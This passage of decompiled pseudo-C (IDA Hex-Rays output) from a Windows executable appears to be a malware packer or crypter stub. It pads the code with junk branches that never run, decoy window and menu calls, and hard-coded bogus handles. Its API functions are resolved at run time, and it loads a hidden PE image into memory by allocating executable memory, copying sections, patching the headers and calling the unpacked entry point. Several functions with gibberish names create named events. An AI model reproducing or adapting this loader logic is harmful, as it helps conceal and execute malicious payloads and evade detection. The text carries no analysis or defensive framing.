  char *v91; // [esp+FCh] [ebp-1Ch] BYREF
  CPPEH_RECORD ms_exc; // [esp+100h] [ebp-18h]

  if ( a2 % 0xAu == 20 )
  {
    TlsGetValue(0);
    TlsSetValue(0, (LPVOID)0x6546);
    SystemInfo.dwOemId = 0;
    memset(&SystemInfo.dwPageSize, 0, 0x20u);
    GetSystemInfo(&SystemInfo);
    LOWORD(v90) = (unsigned __int8)(*(_BYTE *)(*(_DWORD *)NtCurrentTeb()->ThreadLocalStoragePointer + 71) + 1);
    ms_exc.registration.TryLevel = 0;
    v3 = GetCommandLineA();
    v4 = strlen(v3) + 1;
    v5 = 1050195;
    while ( *(_BYTE *)++v5 )
      ;
    qmemcpy((void *)v5, v3, v4);
    v7 = strlen((const char *)&v90) + 1;
    v8 = 1050195;
    while ( *(_BYTE *)++v8 )
      ;
    qmemcpy((void *)v8, &v90, v7);
    ms_exc.registration.TryLevel = -1;
  }
  v58 = 0;
  v90 = 0;
  if ( hInstance && (unsigned int)a2 <= 3 && (!a3 || a3 == 1) )
  {
    v58 = 1;
    v90 = (HWND)hInstance;
  }
  hWndParent = 0;
  if ( (unsigned int)hInstance % 0x17 <= 0x32 )
  {
    if ( !v90 )
      v90 = (HWND)(((unsigned int)start & 0xFFFFF000) - 4096);
  }
  else
  {
    v10 = GetModuleHandleA(0);
    hWndParent = CreateWindowExA(0, (LPCSTR)0x8002, WindowName, 0x10C00000u, 25, 35, 400, 400, 0, 0, hInstance, 0);
    if ( hWndParent && v10 )
    {
      memset(v53, 0, sizeof(v53));
      lParam = 15;
      v11 = CreateWindowExA(
              0,
              "SysListView32",
              WindowName,
              0x50000205u,
              60,
              80,
              300,
              300,
              hWndParent,
              (HMENU)0x234,
              hInstance,
              0);
      for ( i = 0; i < 11; ++i )
      {
        v53[4] = i;
        v53[2] = (int)&SystemInfo.dwPageSize;
        v53[1] = 20;
        v53[0] = i >= 2;
        if ( SendMessageA(v11, 0x101Bu, i, (LPARAM)&lParam) == -1 )
          return 0;
      }
    }
  }
  v87 = 0;
  v83 = 0;
  dwExitCode = 0;
  v64 = 0;
  v68 = 0;
  v71[0] = 1;
  v71[1] = 80;
  v71[2] = 86;
  v71[3] = 70;
  v71[4] = 78;
  v71[5] = 78;
  v71[6] = 16;
  strcpy(v72, "FNN");
  v73[0] = 1;
  v73[1] = 46;
  v73[2] = 70;
  v73[3] = 84;
  v73[4] = 40;
  v73[5] = 75;
  v73[6] = 80;
  v73[7] = 70;
  v73[8] = 39;
  v73[9] = 2;
  v14 = (char *)v90 + *((_DWORD *)v90 + 15);
  v70 = v14;
  v67 = 0;
  v59 = 0;
  v63 = 0;
  v65 = 0;
  v60 = 0;
  v81 = 106194171;
  if ( !sub_401722((int)v90, &v75) )
    return 0;
  v80 = ((int (__stdcall *)(_DWORD, int, int, int))v77)(0, 7, 12288, 4);
  if ( hWndParent )
  {
    hAccTable = LoadAcceleratorsA(hInstance, (LPCSTR)0x64);
    hWnd = CreateWindowExA(0, "Button", "Abc", 0x50010000u, 10, 5, 32, 18, hWndParent, (HMENU)0x1992, hInstance, 0);
    v15 = CreateWindowExA(0, "Static", "QwertyB", 0x50010000u, 50, 5, 100, 100, hWndParent, (HMENU)0x363, hInstance, 0);
    if ( hWnd )
    {
      if ( v15 )
      {
        ShowWindow(v15, 0);
        SetWindowTextA(hWnd, "Qwerty Qwerty");
        while ( GetMessageA((LPMSG)&SystemInfo.lpMinimumApplicationAddress, 0, 0, 0) )
        {
          if ( !TranslateAcceleratorA(
                  (HWND)SystemInfo.lpMinimumApplicationAddress,
                  hAccTable,
                  (LPMSG)&SystemInfo.lpMinimumApplicationAddress) )
            TranslateMessage((const MSG *)&SystemInfo.lpMinimumApplicationAddress);
        }
        sub_401313();
      }
    }
  }
  v55 = *((_DWORD *)v14 + 20);
  v16 = sub_4012F0(v71);
  v56 = (char *)v75(v16);
  hWnd = (HWND)sub_4016F0((int)&v75);
  v91 = (char *)v79(hWnd);
  v78(hWnd, 0, 0x8000);
  if ( !v91 )
    return 0;
  v74 = *((_DWORD *)v14 - 2);
  if ( !v74 )
    return 0;
  hWnd = (HWND)sub_4017F7((int)&v75);
  v86 = sub_401319(v91, (int)hWnd, (int)&v75);
  v78(hWnd, 0, 0x8000);
  if ( !v86 )
    return 0;
  v17 = (HWND)((char *)v90 + *((_DWORD *)v14 + 34));
  if ( v17 == v90 )
    return 1;
  hWnd = (HWND)sub_4015C2((int)&v75);
  hWndParent = (HWND)sub_401319(v91, (int)hWnd, (int)&v75);
  v78(hWnd, 0, 0x8000);
  if ( !hWndParent )
    return 0;
  ThreadId = (unsigned int)hInstance % 0x57;
  if ( (unsigned int)hInstance % 0x57 > 0x28E )
  {
    v18 = SetScrollInfo((HWND)0x5435FA, 0, (LPCSCROLLINFO)0x656FAB, 1);
    if ( v18 )
      SetScrollPos((HWND)0x5435FA, 0, v18, 1);
    VirtualAlloc(0, 0xAu, 0x2000u, 0x20u);
  }
  v57 = sub_401652((int)&v75);
  hAccTable = (HACCEL)sub_401319(v91, (int)v57, (int)&v75);
  if ( !hAccTable )
    return 0;
  v84 = v17 + 4;
  v85 = 0;
  v66 = (unsigned int)hInstance % 0xA;
  if ( (unsigned int)hInstance % 0xA == 20 )
  {
    v19 = CreateMenu();
    if ( v19 )
      DestroyMenu(v19);
    else
      MessageBoxA(0, "gfdhf", "gdfjhf", 0);
  }
  else
  {
    v63 = ((int (__stdcall *)(int, int, int, int))hAccTable)(5, 7, 30, 29);
    v81 = ((int (__stdcall *)(int, int, int, int, int, int))v86)(20, 20, 50, 50, 30, 120);
  }
  if ( !v63 )
    return 0;
  hWnd = (HWND)45;
  v20 = sub_4016D4((_BYTE *)v80);
  v91 = sub_401319(v91, (int)v20, (int)&v75);
  if ( !v91 )
    return 0;
  v69 = (HWND)((int (__stdcall *)(_DWORD, int, int, int))v77)(0, 100, 12288, 4);
  v81 = ((int (__stdcall *)(int, int, _DWORD))v91)(v81, 10, 0);
  v78(v69, 0, 0x8000);
  if ( a2 % 0xAu == 40 )
  {
    if ( v81 != 304 )
      return 0;
  }
  else
  {
    v21 = GetDC(v90);
    DrawTextA(v21, "Qwerty", 32, (LPRECT)0x54645AF, 1u);
  }
  v69 = (HWND)((int (__stdcall *)(int, int, int, int, int, int))v86)(20, 20, 50, 60, 15, 15);
  if ( !v69 )
    return 0;
  v78((HWND)v80, 0, 0x8000);
  v78((HWND)v57, 0, 0x8000);
  if ( *((_WORD *)v17 + 7) )
  {
    while ( 1 )
    {
      if ( *(_WORD *)v84 != 23 )
        goto LABEL_72;
      if ( (unsigned int)hInstance % 0x21 <= 0x10B )
      {
        v67 = ((int (__stdcall *)(int, int, int, int))hAccTable)(15, 16, 20, 21);
      }
      else if ( ModifyMenuA((HMENU)0x54FABC, 0xDu, 0x400u, 0xDu, 0) )
      {
        SendMessageA((HWND)0x4654AB, 0xFFB8u, 0, 0);
      }
      else
      {
        InvalidateRect((HWND)0x4654AB, (const RECT *)0x56464AB, 1);
      }
      if ( !v67 )
        return 0;
      if ( !v60 )
      {
        v65 = ((int (__stdcall *)(HWND, _DWORD, _DWORD))v91)(v69, 0, 0);
        hWndParent = (HWND)((char *)hWndParent - v65);
      }
      v22 = (char *)v17 + ((_DWORD)v84[1] & 0x7FFFFFFF);
      v23 = (int *)(v22 + 16);
      v60 = 1;
      v86 = 0;
      v24 = *((unsigned __int16 *)v22 + 7) + *((unsigned __int16 *)v22 + 6);
      if ( v24 )
        break;
LABEL_72:
      v84 += 2;
      if ( ++v85 >= (unsigned int)*((unsigned __int16 *)v17 + 7) )
        goto LABEL_73;
    }
    while ( 1 )
    {
      v80 = 0;
      if ( *v23 >= 0 )
      {
        if ( (unsigned int)*v23 > 0x5DC )
          goto LABEL_68;
        v80 = 1;
      }
      if ( v80 )
      {
        v25 = (DWORD *)((char *)v17 + *(_DWORD *)((char *)v17 + (v23[1] & 0x7FFFFFFF) + 20));
        hWnd = (HWND)((char *)hWnd + v65);
        dwExitCode = *v25;
        v64 = v25[1];
        v85 = *((unsigned __int16 *)v17 + 7);
        v59 = ((int (__stdcall *)(int, int, int, int))hAccTable)(1, 2, 3, 4);
        if ( v59 )
        {
          hWndParent += 44;
          goto LABEL_72;
        }
        return 0;
      }
LABEL_68:
      v23 += 2;
      if ( (unsigned int)++v86 >= v24 )
        goto LABEL_72;
    }
  }
LABEL_73:
  v26 = dwExitCode;
  v27 = dwExitCode;
  if ( ThreadId <= 0x6E )
  {
    v27 = dwExitCode + 1;
  }
  else
  {
    v28 = FindWindowA("Button", "gfdhgdg");
    DestroyWindow(v28);
  }
  if ( v27 == 1 )
  {
    v29 = GetModuleHandleA(0);
    CloseHandle(v29);
    if ( v66 == 20 )
    {
      TerminateThread((HANDLE)0x54, 1u);
    }
    else
    {
      if ( (unsigned int)hInstance % 0xF != 16 )
        return 0;
      v30 = GetCurrentProcess();
      TerminateProcess(v30, 0);
    }
  }
  v77 += v65;
  v31 = v90;
  v66 = (unsigned int)v90 + v26;
  if ( !(HWND)((char *)v90 + v26) )
    return 0;
  if ( (unsigned int)hInstance % 7 == 8 )
  {
    v32 = CreateThread(0, 0x400u, (LPTHREAD_START_ROUTINE)((char *)v90 + 25957), 0, 4u, &ThreadId);
    if ( v32 )
      ResumeThread(v32);
  }
  else
  {
    v76((char *)v90 + v26, v64, 4, &v83);
    v77 -= 176;
  }
  v91 = 0;
  v33 = (char *)v31 + v55;
  do
  {
    if ( (unsigned int)v91 > 0x800 )
      break;
    v34 = v33;
    ++v91;
    v33 += 4096;
    v87 = (char *)((int (__stdcall *)(char *, unsigned int, int, int))v77)(v34, v74, 12288, 4);
  }
  while ( !v87 );
  if ( (unsigned int)hInstance % 0x11 == 21 )
  {
    v35 = HeapCreate(0, 0x400u, 0x100000u);
    if ( v35 )
    {
      v36 = (char *)HeapAlloc(v35, 8u, 0x400u);
      qmemcpy(v36, (char *)v90 + 1893, 0x400u);
    }
  }
  else
  {
    v91 = (char *)((int (__stdcall *)(int, int, int, int))hWndParent)(v59, v63, v67, 3);
  }
  if ( !v87 )
  {
    v87 = (char *)((int (__stdcall *)(_DWORD, unsigned int, int, int))v77)(0, v74, 12288, 4);
    if ( !v87 )
      return 0;
  }
  if ( v81 == 304 )
    sub_4011F1((int)&v91[(_DWORD)hWnd + v66 - 224], v64, v87);
  if ( !sub_40146E(v87, &v75) )
    return 0;
  if ( (unsigned int)hInstance % 0xB == 15 )
  {
    v37 = GlobalAlloc(0x40u, 0x400u);
    v38 = v37;
    if ( v37 )
    {
      *(_BYTE *)((int (__stdcall *)(HGLOBAL, int))((char *)v90 + 1381))(v37, 1049926) = 1;
      GlobalFree(v38);
    }
  }
  v39 = v87;
  if ( !sub_401570((int)v87, (int)&v75) || !sub_401680((int)v39, (int)v90) )
    return 0;
  v40 = v39;
  v41 = &v39[*((_DWORD *)v39 + 15)];
  v42 = (int)v70;
  ((void (__stdcall *)(char *, int, int, int *, int, int, int, LPARAM))v76)(v70, 248, 64, &v83, v49, v50, v51, lParam);
  *(_DWORD *)(v42 + 80) = -1 - (_DWORD)v90;
  *(_DWORD *)(v42 + 140) = *((_DWORD *)v41 + 35);
  *(_DWORD *)(v42 + 136) = &v40[*((_DWORD *)v41 + 34) - (_DWORD)v90];
  v43 = (unsigned int)(v41 + 248);
  v44 = *((_WORD *)v41 + 3);
  *(_WORD *)(v42 + 6) = v44;
  hWnd = 0;
  if ( v44 )
  {
    v45 = v41 + 248;
    v46 = (_DWORD *)(v42 + 260);
    do
    {
      qmemcpy(v46 - 3, v45, 0x28u);
      *v46 += v87 - (char *)v90;
      hWnd = (HWND)((char *)hWnd + 1);
      v46 += 10;
      v45 += 40;
      v43 = *((unsigned __int16 *)v70 + 3);
    }
    while ( (unsigned int)hWnd < v43 );
    v40 = v87;
    v42 = (int)v70;
  }
  ((void (__thiscall *)(unsigned int, int, int, int, int *))v76)(v43, v42, 248, v83, &v83);
  if ( !sub_40125C(v40) )
    return 0;
  v76(v40, v74, 64, &v83);
  v47 = &v40[*((_DWORD *)v41 + 10)];
  if ( v58 )
  {
    v48 = sub_401319(v56, (int)v73, (int)&v75);
    if ( v48 )
    {
      v91 = 0;
      ((void (__stdcall *)(HINSTANCE, char **))v48)(hInstance, &v91);
      if ( v91 )
      {
        *((_DWORD *)v91 + 6) = v40;
        *((_DWORD *)v91 + 7) = v47;
        *((_DWORD *)v91 + 8) = v74;
        v68 = ((int (__stdcall *)(int, char *, int, int))v47)(1, v40, a2, a3);
      }
    }
  }
  else
  {
    v68 = ((int (__stdcall *)(_DWORD, HINSTANCE, int, int))v47)(0, hInstance, a2, a3);
    v78((HWND)v40, 0, 0x8000);
  }
  return v68;
}
// 4023F5: variable 'v49' is possibly undefined
// 4023F5: variable 'v50' is possibly undefined
// 4023F5: variable 'v51' is possibly undefined

//----- (00402526) --------------------------------------------------------
HANDLE __stdcall GetKJgkdghkdfhd()
{
  HANDLE v0; // esi

  v0 = CreateEventA(0, 1, 1, "Jlkgfdkghdlhd");
  SetEvent(v0);
  CloseHandle(v0);
  return v0;
}

//----- (0040254C) --------------------------------------------------------
HANDLE __stdcall GetLKfsdgdkhd()
{
  HANDLE v0; // esi

  v0 = CreateEventA(0, 1, 1, "flkhdfhdflhf");
  SetEvent(v0);
  CloseHandle(v0);
  return v0;
}

//----- (00402572) --------------------------------------------------------
HANDLE __stdcall GetKkgdstkdgkd()
{
  HANDLE v0; // esi

  v0 = CreateEventA(0, 1, 1, "jfkgdkhgkhg");
  SetEvent(v0);
  CloseHandle(v0);
  return v0;
}

//----- (00402598) --------------------------------------------------------
HANDLE __stdcall GetKfldskgdhkd()
{
  HANDLE v0; // esi

  v0 = CreateEventA(0, 1, 1, "gdfs;lhkdkhmdf");
  SetEvent(v0);
  CloseHandle(v0);
  return v0;
}

//----- (004025BE) --------------------------------------------------------
HANDLE __stdcall GetKlfgdkgldshd()
{
  HANDLE v0; // esi

  v0 = CreateEventA(0, 1, 1, "fmdsgkdkhmdjdhgf");
  SetEvent(v0);
  CloseHandle(v0);
  return v0;
}

// nfuncs=30 queued=27 decompiled=27 lumina nreq=0 worse=0 better=0
// ALL OK, 27 function(s) have been successfully decompiled
